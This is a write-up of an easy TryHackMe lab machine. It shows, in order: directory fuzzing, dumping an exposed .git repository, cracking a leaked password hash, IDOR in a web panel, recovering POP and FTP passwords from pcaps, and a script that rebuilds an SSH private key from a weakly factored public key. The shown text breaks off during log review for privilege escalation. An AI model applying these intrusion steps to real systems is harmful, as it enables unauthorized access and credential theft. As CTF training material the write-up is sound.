---
title: "TryHackMe - RaBi3a's Local Shop"
author: DrLi
description: "Writeup of an easy-rated Linux machine from TryHackMe"
date: 2025-04-07 13:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, fuzzing, pop, python, git, ftp, doas, suid, pcap, forensics, IDOR, cryptography, ssh, logs, adm, view]
img_path: /assets/img/TryHackMe/RaBi3a
image:
    path: /assets/img/TryHackMe/RaBi3a/rabi3a.png
---

<div align="center"> <script src="https://tryhackme.com/badge/2794771"></script> </div>

---

[RaBi3a's Local Shop](https://tryhackme.com/room/rabi3aslocalshop) from [TryHackMe](https://tryhackme.com/)  is an easy Linux machine created by the RaBi3a Team that starts with a custom website. After fuzzing directories, we discovered a hidden .git folder containing login credentials. Inside the web panel, we exploited an IDOR vulnerability to retrieve two .pcap files, which led us to uncover POP and FTP passwords. On the FTP server, we found a weak SSH public key and used it to recover the private key, gaining shell access. Further log analysis revealed another user’s password. Finally, we escalated to root by abusing an SUID binary found during enumeration.

## **Enumeration**

### nmap
We start a nmap scan to check what open ports we have.
```terminal
nmap -T4 --min-rate 1000 -sV -sC -Pn -n -p- 10.10.100.110                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-07 08:42 EDT
Warning: 10.10.100.110 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.100.110
Host is up (0.10s latency).
Not shown: 65527 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 3.0.3
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3d:e9:c8:6e:fd:7d:61:de:5d:bc:ad:9a:dd:28:9f:2a (RSA)
|   256 06:38:7e:e4:76:86:29:df:80:c0:a8:36:fb:dc:ec:d4 (ECDSA)
|_  256 b2:2f:af:98:1a:91:98:32:57:1b:a2:af:6a:e6:34:a8 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: rabi3a.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=rabi3a
| Subject Alternative Name: DNS:rabi3a
| Not valid before: 2025-04-05T18:35:01
|_Not valid after:  2035-04-03T18:35:01
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-git: 
|   10.10.100.110:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: final css script 
|_http-title: 403 Forbidden
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: USER PIPELINING UIDL RESP-CODES SASL(PLAIN) TOP STLS CAPA AUTH-RESP-CODE
| ssl-cert: Subject: commonName=rabi3a
| Subject Alternative Name: DNS:rabi3a
| Not valid before: 2025-04-05T18:35:01
|_Not valid after:  2035-04-03T18:35:01
143/tcp open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=rabi3a
| Subject Alternative Name: DNS:rabi3a
| Not valid before: 2025-04-05T18:35:01
|_Not valid after:  2035-04-03T18:35:01
|_imap-capabilities: have capabilities IDLE post-login AUTH=PLAINA0001 more Pre-login listed IMAP4rev1 OK SASL-IR LITERAL+ ID LOGIN-REFERRALS STARTTLS ENABLE
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: have IDLE Pre-login post-login more capabilities listed IMAP4rev1 OK ENABLE SASL-IR ID LOGIN-REFERRALS LITERAL+ AUTH=PLAINA0001
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=rabi3a
| Subject Alternative Name: DNS:rabi3a
| Not valid before: 2025-04-05T18:35:01
|_Not valid after:  2035-04-03T18:35:01
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: USER RESP-CODES SASL(PLAIN) PIPELINING UIDL TOP CAPA AUTH-RESP-CODE
| ssl-cert: Subject: commonName=rabi3a
| Subject Alternative Name: DNS:rabi3a
| Not valid before: 2025-04-05T18:35:01
|_Not valid after:  2035-04-03T18:35:01
|_ssl-date: TLS randomness does not represent time
Service Info: Host:  rabi3a.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.30 seconds
```

there is a lot of ports open but the only one we can access is port 80 because all the others require authentication 
so let's see what we can find in the website 
## HTTP
![index](/assets/img/TryHackMe/RaBi3a/1.png)

there is only a web page saying that this is forbidden
let's fuzz for directories
```terminal
dirsearch -u http://10.10.100.110/                              
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict
                  
                                                                                                                                                                                                                           
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/drli/Downloads/reports/http_10.10.100.110/__25-04-07_08-46-16.txt

Target: http://10.10.100.110/

[08:46:16] Starting:                                                                                                                                                                                                                        
[08:46:21] 301 -  313B  - /.git  ->  http://10.10.100.110/.git/             
[08:46:21] 200 -   17B  - /.git/COMMIT_EDITMSG
[08:46:21] 200 -  409B  - /.git/branches/
[08:46:21] 200 -   92B  - /.git/config                                      
[08:46:21] 200 -   73B  - /.git/description
[08:46:21] 200 -   23B  - /.git/HEAD                                        
[08:46:21] 200 -  634B  - /.git/hooks/                                      
[08:46:21] 200 -  607B  - /.git/                                            
[08:46:21] 200 -  255B  - /.git/index                                       
[08:46:21] 200 -  240B  - /.git/info/exclude                                
[08:46:21] 200 -  456B  - /.git/info/
[08:46:21] 200 -  482B  - /.git/logs/                                       
[08:46:21] 200 -    3KB - /.git/logs/HEAD
[08:46:21] 301 -  323B  - /.git/logs/refs  ->  http://10.10.100.110/.git/logs/refs/
[08:46:21] 200 -    3KB - /.git/logs/refs/heads/master                      
[08:46:21] 301 -  329B  - /.git/logs/refs/heads  ->  http://10.10.100.110/.git/logs/refs/heads/
[08:46:21] 301 -  324B  - /.git/refs/heads  ->  http://10.10.100.110/.git/refs/heads/
[08:46:21] 200 -  463B  - /.git/refs/
[08:46:21] 200 -   41B  - /.git/refs/heads/master                           
[08:46:21] 301 -  323B  - /.git/refs/tags  ->  http://10.10.100.110/.git/refs/tags/
[08:46:21] 200 - 1019B  - /.git/objects/                                    
[08:46:21] 200 -  112B  - /.gitignore                                                                                 
[08:46:46] 301 -  316B  - /default  ->  http://10.10.100.110/default/       
[08:46:57] 301 -  314B  - /login  ->  http://10.10.100.110/login/           
[08:46:57] 200 -  563B  - /login/                                           
[08:47:03] 301 -  314B  - /panel  ->  http://10.10.100.110/panel/           
[08:47:03] 302 -    0B  - /panel/  ->  ../login/index.php                   
[08:47:10] 403 -  278B  - /server-status                                    
[08:47:10] 403 -  278B  - /server-status/                                   
                                                                             
Task Completed
```
we can see that there is .git, login and panel directories they could be interesting for us
but first let's start with dumping the .git to our machine and see if we can find anything 

```terminal
git-dumper http://10.10.100.110/.git .
[-] Testing http://10.10.100.110/.git/HEAD [200]
[-] Testing http://10.10.100.110/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://10.10.100.110/.git/ [200]
[-] Fetching http://10.10.100.110/.gitignore [200]
[-] Fetching http://10.10.100.110/.git/logs/ [200]
[-] Fetching http://10.10.100.110/.git/objects/ [200]
[-] Fetching http://10.10.100.110/.git/branches/ [200]
[-] Fetching http://10.10.100.110/.git/COMMIT_EDITMSG [200]
[-] Fetching http://10.10.100.110/.git/refs/ [200]
[-] Fetching http://10.10.100.110/.git/config [200]
[-] Fetching http://10.10.100.110/.git/description [200]
[-] Fetching http://10.10.100.110/.git/HEAD [200]
[-] Fetching http://10.10.100.110/.git/objects/03/ [200]
[-] Fetching http://10.10.100.110/.git/logs/refs/heads/ [200]
[-] Fetching http://10.10.100.110/.git/objects/03/e9e6e395a2771c62c9d37294437e7176217278 [200]
[-] Fetching http://10.10.100.110/.git/objects/0d/b14edb9c2d241706d34e95cc375212ee4d7504 [200]
[-] Fetching http://10.10.100.110/.git/info/ [200]
[-] Fetching http://10.10.100.110/.git/logs/refs/heads/master [200]
[-] Fetching http://10.10.100.110/.git/info/exclude [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 2 paths from the index
                                
┌──(drli㉿kali)-[~/Downloads/rabi3a]
└─$ ls -la
total 20
drwxrwxr-x  4 drli drli 4096 Apr  7 08:51 .
drwxr-xr-x 17 drli drli 4096 Apr  7 08:48 ..
drwxrwxr-x  7 drli drli 4096 Apr  7 08:51 .git
-rw-rw-r--  1 drli drli  112 Apr  7 08:51 .gitignore
drwxrwxr-x  2 drli drli 4096 Apr  7 08:51 login
                                                                                                                                                                                                                                          
┌──(drli㉿kali)-[~/Downloads/rabi3a]
└─$ git log                                                         
commit 0db14edb9c2d241706d34e95cc375212ee4d7504 (HEAD -> master)
Author: root <root@rabi3a.local>
Date:   Sun Apr 6 21:46:44 2025 +0000

    final css script

commit 1218692c9ef097dca4c69877acd4f57a517c077f
Author: root <root@rabi3a.local>
Date:   Sun Apr 6 21:44:36 2025 +0000

    Refactor CSS for mobile responsiveness

commit 69bbfa416e98dcd944f94f7dfd837f25b12aba11
Author: root <root@rabi3a.local>
Date:   Sun Apr 6 21:44:18 2025 +0000

    Added styles for the header section

commit bf136380f17605fa9ee74e44bf8b6533a75c7d9e
Author: root <root@rabi3a.local>
Date:   Sun Apr 6 21:43:24 2025 +0000

    final login script

commit 447ac84e593d914ac011858c0cd19aa76fff6edd
Author: root <root@rabi3a.local>
Date:   Sun Apr 6 21:41:58 2025 +0000

    Updated user profile section

```
as we can see there is alot of commits 
so let's check them for anything left in the old code versions 

```terminal
git log -p
commit 0db14edb9c2d241706d34e95cc375212ee4d7504 (HEAD -> master)
Author: root <root@rabi3a.local>
Date:   Sun Apr 6 21:46:44 2025 +0000

    final css script

diff --git a/login/login.css b/login/login.css
index 4c24a2e..2cda721 100755
--- a/login/login.css
+++ b/login/login.css
@@ -1,4 +1,4 @@
-@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap");
+import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap");
 
 * {
     margin: 0;
@@ -114,9 +114,3 @@ body {
 
 .register-link p a:hover {
     text-decoration: underline;
-}/* Added extra padding for mobile view */
-/* Added styles for header */
-/* Added styles for header */
-/* Added extra padding for mobile view */
-/* Added styles for header */
-/* Added extra padding for mobile view */

commit 1218692c9ef097dca4c69877acd4f57a517c077f
Author: root <root@rabi3a.local>
Date:   Sun Apr 6 21:44:36 2025 +0000

    Refactor CSS for mobile responsiveness

diff --git a/login/login.css b/login/login.css
index 261c02f..4c24a2e 100755
--- a/login/login.css
+++ b/login/login.css
@@ -119,3 +119,4 @@ body {
 /* Added styles for header */
 /* Added extra padding for mobile view */
 /* Added styles for header */
+/* Added extra padding for mobile view */

commit 69bbfa416e98dcd944f94f7dfd837f25b12aba11
Author: root <root@rabi3a.local>
Date:   Sun Apr 6 21:44:18 2025 +0000

    Added styles for the header section

diff --git a/login/login.css b/login/login.css
index f4c94f3..261c02f 100755
--- a/login/login.css
+++ b/login/login.css
@@ -118,3 +118,4 @@ body {
 /* Added styles for header */
 /* Added styles for header */
 /* Added extra padding for mobile view */
+/* Added styles for header */

commit bf136380f17605fa9ee74e44bf8b6533a75c7d9e
Author: root <root@rabi3a.local>
Date:   Sun Apr 6 21:43:24 2025 +0000

    final login script

diff --git a/login/index.php b/login/index.php
index f0aac15..737c412 100755
--- a/login/index.php
+++ b/login/index.php
@@ -6,21 +6,20 @@ session_start();
 $mysqli = require __DIR__ . "/../sidialidb/conn.php";
 $error_message = "";
 
-
-$encoded = "819423a698f9ea9ba3577f20993cb0da98a79ea22ce5d6550b65b69fb36fd438"; 
-
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST['username'];
     $password = $_POST['password'];
     $hashedPassword = hash('sha256', $password);
 
     if (strtolower($username) !== 'admin') {
-        $error_message = "Username must be 'admin' (5 characters).";
+        $error_message = "Username must be 'admin'.";
     }
 
     if (empty($error_message)) {
-        // Here we can compare the password hash directly with the encoded password
-        if ($hashedPassword === $encoded_password) {
+        $sql = "SELECT id FROM users WHERE username = '$username' AND password = '$hashedPassword' LIMIT 1";
+        $result = $mysqli->query($sql);
+
+        if ($result->num_rows > 0) {
             $_SESSION['user'] = $username;
             header("Location: ../panel/index.php");
             exit;
@@ -71,7 +70,3 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 </body>
 </html>
-    // Fixed indentation issues
-<?php // Placeholder for future notification feature ?>
-/* Created placeholder for future feature */
-// Added a new section for user profile
```
we were able to find a hash in the commits 
let's crack this, it looks like a SHA256 hash

```terminal
echo "819423a698f9ea9ba3577f20993cb0da98a79ea22ce5d6550b65b69fb36fd438" > hash.txt
                                                                                                                                                                                                                                            
┌──(drli㉿kali)-[~/Downloads/rabi3a]
└─$ john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 SSE2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
deeznuts         (?)     
1g 0:00:00:00 DONE (2025-04-07 08:53) 33.33g/s 546133p/s 546133c/s 546133C/s 123456..cocoliso
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed. 
                    
```
this looks like a password so let's try it in the login page we found 
![login](/assets/img/TryHackMe/RaBi3a/2.png)

after trying a random name in the username field we get this weird error 

![login_error](/assets/img/TryHackMe/RaBi3a/3.png)

this hints us that the username is admin and we found a password earlier so let's login

![panel](/assets/img/TryHackMe/RaBi3a/4.png)

"da3li" is the admin responsible for the website maybe we will need this username for something later on 
now let's keep investigating the panel 

![messages](/assets/img/TryHackMe/RaBi3a/5.png)

in the message we can see that the url takes the parametre user and we probably found another user "hamid" 
let's try and change "hamid" to "da3li"  

![web_flag](/assets/img/TryHackMe/RaBi3a/6.png)

now let's move on to the order section

there is some items for sale and if we click on them we get this 

![orders](/assets/img/TryHackMe/RaBi3a/7.png)

the url again takes a weird hash as the id of the item

![secret](/assets/img/TryHackMe/RaBi3a/8.png)

let's collect all the hashes and crack them to see what they mean 

```terminal

Hash	                            Type	Result
dd7536794b63bf90eccfd37f9b147d7f	md5	    I
66cc12e3c6d68de3fef6de89cf033f67	md5	    II
51ac4581fa82be87a28f7c080e026ae6	md5	    III
```

we can see that there is a pattern and its probably Roman numbers 

after trying Roman numbers from 4 to 9 i didnt get anything but number 10 gave this 

![secret](/assets/img/TryHackMe/RaBi3a/9.png)

in the pcap file we can find alot of traffic and some of them are HTTP packets 

let's follow the stream

![pcap1](/assets/img/TryHackMe/RaBi3a/11.png)

at the buttom of the response there is a hint 

```terminal
    <h1>You are on the right track, keep going!</h1>
    <p>So maybe look here:</p>
    <p><strong>x = 1000 + 300 + 30 + 7</strong></p>
```
this might about the Roman number we should put in the id parameter

let's convert 1337 to Ramon numbers

```terminal
    1337 = MCCCXXXVII
    The md5 hash of MCCCXXXVII is f4176475808c9d7c75ffd3748a6ef457 
```    

atfer putting the hash in the id parametre we get another pcap file 

![pcap2](/assets/img/TryHackMe/RaBi3a/10.png)

this pcap has some POP packets and we can see "rabi3a" is trying to connect to the POP but the password is incorrect 

![pop](/assets/img/TryHackMe/RaBi3a/12.png)

after looking further in the pcap we can find some http traffic 

they provide another hint regarding the password

![hint](/assets/img/TryHackMe/RaBi3a/13.png)

the hint suggest to XOR the passowrd let's use cyberchef and try XOR BruteForce

![XOR1](/assets/img/TryHackMe/RaBi3a/14.png)

no valid password is in the output

the hint in tryhackme says to increase the key length so let's do it 

![XOR2](/assets/img/TryHackMe/RaBi3a/15.png)

the third key gives the password "T7ine_3_Baydat_w_Khmara"

now let's connect to the pop service
## POP
```terminal
telnet 10.10.100.110 110
Trying 10.10.100.110...
Connected to 10.10.100.110.
Escape character is '^]'.
+OK Dovecot (Ubuntu) ready.
user rabi3a
+OK
pass T7ine_3_Baydat_w_Khmara
+OK Logged in.
list
+OK 15 messages:
1 493
2 637
3 644
4 670
5 637
6 652
7 651
8 678
9 619
10 670
11 648
12 657
13 743
14 653
15 682
.
retr 9
+OK 619 octets
Return-Path: <da3li@rabi3a.local>
X-Original-To: rabi3a@rabi3a.local
Delivered-To: rabi3a@rabi3a.local
Received: from [127.0.1.1] (mail.rabi3a.local [172.16.146.128])
        by rabi3a.localdomain (Postfix) with ESMTP id D0591601ED
        for <rabi3a@rabi3a.local>; Sat,  5 Apr 2025 18:57:42 +0000 (UTC)
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Subject: Message for Mom
From: da3li@rabi3a.local
To: rabi3a@rabi3a.local
Message-Id: <20250405185742.D0591601ED@rabi3a.localdomain>
Date: Sat,  5 Apr 2025 18:57:42 +0000 (UTC)

RaBi3a{Tge3ed_Lappel_Hadi_Akhir_Appel}
.
retr 13
+OK 743 octets
Return-Path: <da3li@rabi3a.local>
X-Original-To: rabi3a@rabi3a.local
Delivered-To: rabi3a@rabi3a.local
Received: from [127.0.1.1] (mail.rabi3a.local [172.16.146.128])
        by rabi3a.localdomain (Postfix) with ESMTP id DBA94601ED
        for <rabi3a@rabi3a.local>; Sat,  5 Apr 2025 18:57:42 +0000 (UTC)
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Subject: Message for Mom
From: da3li@rabi3a.local
To: rabi3a@rabi3a.local
Message-Id: <20250405185742.DBA94601ED@rabi3a.localdomain>
Date: Sat,  5 Apr 2025 18:57:42 +0000 (UTC)

Mom I got a problem!

Dad said my key is weak and I dont know why.
Here is my creds so you can check it out
and tell me what's going on.
da3li:7ob7yatifati7a
.
quit
+OK Logging out.
Connection closed by foreign host.
```
we found a password for "da3li" 

if we try to connect to ssh using "rabi3a" or "da3li" passwords we wont be able so there must be another way

## FTP
FTP is open let's try to connect to it 

```terminal
ftp 10.10.100.110
Connected to 10.10.100.110.
220 (vsFTPd 3.0.3)
Name (10.10.100.110:drli): da3li
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||10061|)
150 Here comes the directory listing.
dr-xr-xr-x    8 1002     1002         4096 Apr 05 20:31 .
dr-xr-xr-x    8 1002     1002         4096 Apr 05 20:31 ..
drwxr-xr-x    2 1002     1002         4096 Apr 05 20:34 ...
drwxr-xr-x    2 1002     1002         4096 Apr 05 20:31 Desktop
drwxr-xr-x    3 1002     1002         4096 Apr 05 20:34 Documents
drwxr-xr-x    2 1002     1002         4096 Apr 05 20:31 Downloads
drwxr-xr-x    2 1002     1002         4096 Apr 05 20:31 Pictures
drwxr-xr-x    2 1002     1002         4096 Apr 05 20:31 Videos
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||10024|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Apr 05 20:34 .
dr-xr-xr-x    8 1002     1002         4096 Apr 05 20:31 ..
-rw-r--r--    1 1002     1002           48 Apr 05 20:34 flag3.txt
226 Directory send OK.
ftp> get flag3.txt
local: flag3.txt remote: flag3.txt
229 Entering Extended Passive Mode (|||10058|)
150 Opening BINARY mode data connection for flag3.txt (48 bytes).
100% |***********************************************************************************************************************************************************************************************|    48        0.48 KiB/s    00:00 ETA
226 Transfer complete.
48 bytes received in 00:00 (0.26 KiB/s)
ftp> cd ..
250 Directory successfully changed.
ftp> cd Do
Documents       Downloads
ftp> cd Documents/MyKey
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||10020|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Apr 05 20:35 .
drwxr-xr-x    3 1002     1002         4096 Apr 05 20:34 ..
-rw-r--r--    1 1002     1002          726 Apr 05 20:35 id_rsa.pub
226 Directory send OK.
ftp> get id_rsa.pub
local: id_rsa.pub remote: id_rsa.pub
229 Entering Extended Passive Mode (|||10032|)
150 Opening BINARY mode data connection for id_rsa.pub (726 bytes).
100% |***********************************************************************************************************************************************************************************************|   726       11.93 MiB/s    00:00 ETA
226 Transfer complete.
726 bytes received in 00:00 (8.70 KiB/s)
ftp> bye
221 Goodbye.
                                                                                                                                                                                                                                            
┌──(drli㉿kali)-[~/Downloads/rabi3a]
└─$ cat flag3.txt      
RaBi3a{Wahed_Ma_Rah_Ysarf_3liya_Ha_Twal_Lisan}

                                                                                                                                                                                                                                            
┌──(drli㉿kali)-[~/Downloads/rabi3a]
└─$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDrZh8oe8Q8j6kt26IZ906kZ7XyJ3sFCVczs1Gqe8w7ZgU+XGL2vpSD100andPQMwDi3wMX98EvEUbTtcoM4p863C3h23iUOpmZ3Mw8z51b9DEXjPLunPnwAYxhIxdP7czKlfgUCe2n49QHuTqtGE/Gs+avjPcPrZc3VrGAuhFM4P+e4CCbd9NzMtBXrO5HoSV6PEw7NSR7sWDcAQ47cd287U8h9hIf9Paj6hXJ8oters0CkgfbuG99SVVykoVkMfiRXIpu+Ir8Fu1103Nt/cv5nJX5h/KpdQ8iXVopmQNFzNFJjU2De9lohLlUZpM81fP1cDwwGF3X52FzgZ7Y67Je56Rz/fc8JMhqqR+N5P5IyBcSJlfyCSGTfDf+DNiioRGcPFIwH+8cIv9XUe9QFKo9tVI8ElE6U80sXxUYvSg5CPcggKJy68DET2TSxO/AGczxBjSft/BHQ+vwcbGtEnWgvZqyZ49usMAfgz0t6qFp4g1hKFCutdMMvPoHb1xGw9b1FhbLEw6j9s7lMrobaRu5eRiAcIrJtv+5hqX6r6loOXpd0Ip1hH/Ykle2fFfiUfNWCcFfre2AIQ1px9pL0tg8x1NHd55edAdNY3mbk3I66nthA5a0FrKrnEgDXLVLJKPEUMwY8JhAOizdOCpb2swPwvpzO32OjjNus7tKSRe87w==
```

from the email where we found the password it says that the key is weak so they must be talking about this public key here 
let's craft a script to create the private key using this public key then connect to ssh 

```terminal
import base64
import requests
from Cryptodome.PublicKey import RSA
from Cryptodome.Util.number import inverse
import re

def decode_ssh_rsa_pubkey(key):
    key_parts = key.strip().split()
    if len(key_parts) < 2 or key_parts[0] != 'ssh-rsa':
        raise ValueError("Invalid SSH RSA key format")

    data = base64.b64decode(key_parts[1])
    parts = []

    while data:
        l = int.from_bytes(data[:4], 'big')
        parts.append(data[4:4+l])
        data = data[4+l:]

    e = int.from_bytes(parts[1], 'big')
    n = int.from_bytes(parts[2], 'big')
    return e, n

def get_factors_from_factordb(n):
    session = requests.Session()
    url = f"https://factordb.com/api?query={n}"
    r = session.get(url)
    data = r.json()

    if data["status"] != "FF":
        print(f"[*] Modulus not fully factored or too strong: {data['status']}")
        return None, None

    factors = data["factors"]
    p = int(factors[0][0])
    q = int(factors[1][0])
    return p, q

def reconstruct_rsa_privkey(n, e, p, q):
    phi = (p - 1) * (q - 1)
    d = inverse(e, phi)
    key = RSA.construct((n, e, d, p, q))
    return key.export_key()

# -- MAIN --
ssh_key = """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDrZh8oe8Q8j6kt26IZ906kZ7XyJ3sFCVczs1Gqe8w7ZgU+XGL2vpSD100andPQMwDi3wMX98EvEUbTtcoM4p863C3h23iUOpmZ3Mw8z51b9DEXjPLunPnwAYxhIxdP7czKlfgUCe2n49QHuTqtGE/Gs+avjPcPrZc3VrGAuhFM4P+e4CCbd9NzMtBXrO5HoSV6PEw7NSR7sWDcAQ47cd287U8h9hIf9Paj6hXJ8oters0CkgfbuG99SVVykoVkMfiRXIpu+Ir8Fu1103Nt/cv5nJX5h/KpdQ8iXVopmQNFzNFJjU2De9lohLlUZpM81fP1cDwwGF3X52FzgZ7Y67Je56Rz/fc8JMhqqR+N5P5IyBcSJlfyCSGTfDf+DNiioRGcPFIwH+8cIv9XUe9QFKo9tVI8ElE6U80sXxUYvSg5CPcggKJy68DET2TSxO/AGczxBjSft/BHQ+vwcbGtEnWgvZqyZ49usMAfgz0t6qFp4g1hKFCutdMMvPoHb1xGw9b1FhbLEw6j9s7lMrobaRu5eRiAcIrJtv+5hqX6r6loOXpd0Ip1hH/Ykle2fFfiUfNWCcFfre2AIQ1px9pL0tg8x1NHd55edAdNY3mbk3I66nthA5a0FrKrnEgDXLVLJKPEUMwY8JhAOizdOCpb2swPwvpzO32OjjNus7tKSRe87w=="""

e, n = decode_ssh_rsa_pubkey(ssh_key)
print("[*] Extracted RSA parameters.")
print(f"e = {e}\nn = {n}")

p, q = get_factors_from_factordb(n)
if p and q:
    print(f"[*] Found factors:\np = {p}\nq = {q}")
    priv_key = reconstruct_rsa_privkey(n, e, p, q)
    with open("id_rsa", "wb") as f:
        f.write(priv_key)
    print("[+] Private key saved to id_rsa")
else:
    print("[!] Could not factor modulus.")
```
after running this code we get the private now let's connect

## Initial Access
```terminal
ssh -i id_rsa da3li@10.10.100.110
The authenticity of host '10.10.100.110 (10.10.100.110)' can't be established.
ED25519 key fingerprint is SHA256:ZeEGdADfjkkkcnddTilJSGG2sJNkpDoeLiDDJObbPVo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.100.110' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Apr  7 13:10:01 UTC 2025

  System load:  0.16               Processes:           110
  Usage of /:   32.1% of 19.52GB   Users logged in:     0
  Memory usage: 72%                IP address for eth0: 10.10.100.110
  Swap usage:   0%


40 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

New release '20.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

da3li@rabi3a:~$ pwd
/home/da3li
da3li@rabi3a:~$ ls -la
total 44
drwxr-xr-x 6 da3li da3li 4096 Apr  7 13:10 .
drwxr-xr-x 5 root  root  4096 Apr  5 21:12 ..
-rw------- 1 da3li da3li    1 Apr  5 21:15 .bash_history
-rw-r--r-- 1 da3li da3li  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 da3li da3li 3771 Apr  4  2018 .bashrc
drwx------ 2 da3li da3li 4096 Apr  7 13:10 .cache
-rw-r--r-- 1 da3li da3li   56 Apr  5 20:36 flag4.txt
dr-xr-xr-x 8 da3li da3li 4096 Apr  5 20:31 ftp
drwx------ 3 da3li da3li 4096 Apr  7 13:10 .gnupg
-rw-r--r-- 1 da3li da3li  807 Apr  4  2018 .profile
drwxr-xr-x 2 da3li da3li 4096 Apr  5 20:37 .ssh
da3li@rabi3a:~$ cat flag4.txt 
RaBi3a{Ya_Dem_3omreh_Ma_Yweli_Ma_w_Rabi_Ychadli_Fi_Ma}

da3li@rabi3a:~$ id
uid=1002(da3li) gid=1002(da3li) groups=1002(da3li),4(adm)
```
if we look closely we can see that "da3li" is part of the adm group 

which means he can read some log files 

let's read some and see if we can find anything interesting
## Privilege Escalation
```terminal
da3li@rabi3a:/var/log$ cat auth.log
Apr  5 21:14:45 rabi3a sudo: pam_unix(sudo:session): session closed for user root
Apr  5 21:14:45 rabi3a sudo:     root : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/truncate -s 0 /var/log/kern.log
Apr  5 21:14:45 rabi3a sudo: pam_unix(sudo:session): session opened for user root by hamid(uid=0)
Apr  5 21:14:45 rabi3a sudo: pam_unix(sudo:session): session closed for user root
Apr  5 21:14:45 rabi3a sudo:     root : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/truncate -s 0 /var/log/dpkg.log
Apr  5 21:14:45 rabi3a sudo: pam_unix(sudo:session): session opened for user root by hamid(uid=0)
Apr  5 21:14:45 rabi3a sudo: pam_unix(sudo:session): session closed for user root
Apr  5 21:14:45 rabi3a sudo:     root : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/truncate -s 0 /var/log/apt/history.log
Apr  5 21:14:45 rabi3a sudo: pam_unix(sudo:session): session opened for user root by hamid(uid=0)
Apr  5 21:14:45 rabi3a sudo: pam_unix(sudo:session): session closed for user root
Apr  5 21:14:45 rabi3a sudo:     root : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/truncate -s 0 /var/log/apt/term.log
Apr  5 21:14:45 rabi3a sudo: pam_unix(sudo:session): session opened for user root by hamid(uid=0)
Apr  5 21:14:45 rabi3a sudo: pam_unix(sudo:session): session closed for user root
Apr  5 21:14:46 rabi3a sudo:     root : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/truncate -s 0 /var/log/auth.log.1
Apr  5 21:14:46 rabi3a sudo: pam_unix(sudo:session): session opened for user root by hamid(uid=0)
Apr  5 21:14:46 rabi3a sudo: pam_unix(sudo:session): session closed for user root
